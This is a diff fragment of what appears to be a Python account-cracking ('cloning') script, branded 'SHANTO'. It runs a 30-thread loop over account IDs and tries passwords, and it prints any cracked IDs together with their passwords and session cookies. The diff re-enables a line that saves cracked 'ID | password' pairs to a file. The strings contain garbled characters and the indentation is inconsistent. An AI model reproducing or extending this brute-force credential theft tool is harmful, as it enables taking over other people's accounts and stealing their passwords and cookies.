@@ -423,6 +423,7 @@ def passwrd():
     print("\033[97;1m[\033[92;1m+\033[97;1m] \033[10;95mCLONING SPEED SUPER FAST-!✅")
     print(f'\033[97;1m[\033[92;1m•\033[97;1m] \033[1;92mUse Flight Mode For Speed Up ')
     print('\033[0;97m===============================================')
+
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -500,7 +501,7 @@ def crack(idf,pwv):
 				#SHANTO-King
 				print(f'\r\033[0;94m[{time.strftime("%H:%M")}â€¢SHANTO-Cp] {idf} â€¢ {pw}\n\033[0;93[ðŸ¤Ÿ]= COOKIESâ€¢ \033[0;92m{kuki} ')     
 				os.system('espeak -a 300 " C,  P"')
-			    #open('CP/'+cpc,'a').write(idf+' | '+pw+'\n')
+			    open('CP/'+cpc,'a').write(idf+' | '+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
 				break
